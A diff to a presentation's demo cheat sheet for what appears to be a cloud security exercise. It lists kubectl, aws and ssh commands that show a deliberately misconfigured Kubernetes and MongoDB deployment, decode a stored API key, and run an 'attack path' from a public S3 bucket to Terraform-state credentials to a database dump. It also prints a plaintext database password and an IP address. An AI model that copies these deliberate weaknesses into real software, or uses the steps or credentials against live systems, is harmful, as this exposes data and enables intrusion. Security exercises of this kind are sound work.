@@ -325,42 +325,94 @@ Minimal closing slide on dark navy background (#0a0e1a). Center-aligned composit
 
 ## DEMO CHEAT SHEET — Commands to have ready in terminal
 
+### Kubernetes — app and infrastructure
 ```bash
-# Show running pod
+# Show running pod and which node it's on
 kubectl get pods -o wide
 
-# Show all K8s objects
+# Show all key K8s objects at once
 kubectl get deployment,service,ingress,clusterrolebinding | grep movie-buddy
 
-# Show ingress details (ALB, cert, annotations)
+# Show ingress details (ALB hostname, certificate ARN, annotations)
 kubectl describe ingress movie-buddy-ingress
 
-# Show secrets (names only, values hidden)
+# Show secrets exist (values hidden by Kubernetes)
 kubectl get secret movie-buddy-secrets -o jsonpath='{.data}' | python3 -m json.tool
 
-# Show wizexercise.txt
-kubectl exec -it $(kubectl get pod -l app=movie-buddy -o jsonpath='{.items[0].metadata.name}') -- cat /app/wizexercise.txt
+# Decode a specific secret value (e.g. anthropic_api_key)
+kubectl get secret movie-buddy-secrets -o jsonpath='{.data.anthropic_api_key}' | base64 -d
 
-# Show data in MongoDB
+# Show cluster-admin role binding (intentional weakness)
+kubectl get clusterrolebinding movie-buddy-cluster-admin -o yaml
+```
+
+### wizexercise.txt — proof the file is in the container
+```bash
+# Show the file exists and contains your name
+kubectl exec -it $(kubectl get pod -l app=movie-buddy -o jsonpath='{.items[0].metadata.name}') -- cat /app/wizexercise.txt
+```
+*(Have this ready if challenged — not required to show proactively unless asked)*
+
+### MongoDB — prove data is persisted
+```bash
+# Show profile data saved in MongoDB
 kubectl exec -it $(kubectl get pod -l app=movie-buddy -o jsonpath='{.items[0].metadata.name}') -- python3 -c "
 from pymongo import MongoClient; import os, json
 c = MongoClient(os.environ['MONGO_URL'])
 docs = list(c.movie_buddy.profiles.find({}, {'_id': 0}))
 print(json.dumps(docs, indent=2, default=str))
 "
+```
 
-# Show MongoDB backup files in S3
+### MongoDB backups — prove automated backups are running
+```bash
+# Show backup files exist in S3 (one per day since June 13)
 aws s3 ls s3://movie-buddy-db-backups/
 
-# Show Terraform state with credentials (attack path demo)
-aws s3 cp s3://movie-buddy-tfstate-329153220664/wiz-exercise/terraform.tfstate - | python3 -m json.tool | grep -A3 mongodb_url
+# Show the backup script itself
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "cat /usr/local/bin/backup-mongodb.sh"
 
-# Show S3 bucket is publicly accessible (open in browser, no login)
-# https://movie-buddy-db-backups.s3.amazonaws.com/
+# Show the cron job that runs it at 2am daily
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "cat /etc/cron.d/mongodb-backup"
+```
+*(Have these ready if challenged — show the S3 listing proactively during the attack path demo)*
 
-# SSH to MongoDB server (demonstrate open SSH)
+### EC2 / MongoDB server
+```bash
+# SSH to MongoDB server (demonstrates open SSH to internet — intentional weakness)
 ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237
 
-# Check MongoDB and OS version
-ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "mongod --version && lsb_release -a"
+# Check MongoDB version (outdated — intentional)
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "mongod --version"
+
+# Check OS version (Ubuntu 20.04 — over 1 year outdated — intentional)
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "lsb_release -a"
+
+# Show overly permissive security group (SSH open to 0.0.0.0/0)
+aws ec2 describe-security-groups --group-ids sg-03dce51e1f51d0137 \
+  --query "SecurityGroups[0].IpPermissions" --output table
+
+# Show AdministratorAccess IAM role on EC2
+aws ec2 describe-instances \
+  --filters "Name=tag:Name,Values=movie-buddy-mongodb" \
+  --query "Reservations[0].Instances[0].IamInstanceProfile.Arn" --output text
 ```
+
+### Attack path demo — public S3 → credentials → database
+```bash
+# Step 1: Show S3 bucket is publicly readable (open in browser, no credentials)
+# URL: https://movie-buddy-db-backups.s3.amazonaws.com/
+
+# Step 2: Show Terraform state file is in the public bucket
+aws s3 ls s3://movie-buddy-tfstate-329153220664/wiz-exercise/
+
+# Step 3: Extract MongoDB credentials from state file (no auth required)
+aws s3 cp s3://movie-buddy-tfstate-329153220664/wiz-exercise/terraform.tfstate - \
+  | python3 -m json.tool | grep -A3 mongodb_url
+
+# Step 4: Use extracted credentials to connect to MongoDB and dump data
+# (replace password if needed — it's in the state file output above)
+mongosh "mongodb://admin:MovieBuddy2024\!@100.52.232.237:27017" \
+  --eval "db.getSiblingDB('movie_buddy').profiles.find().pretty()"
+```
+*(Note: mongosh must be installed locally for Step 4. Alternative: SSH into EC2 first, then run mongosh from there)*
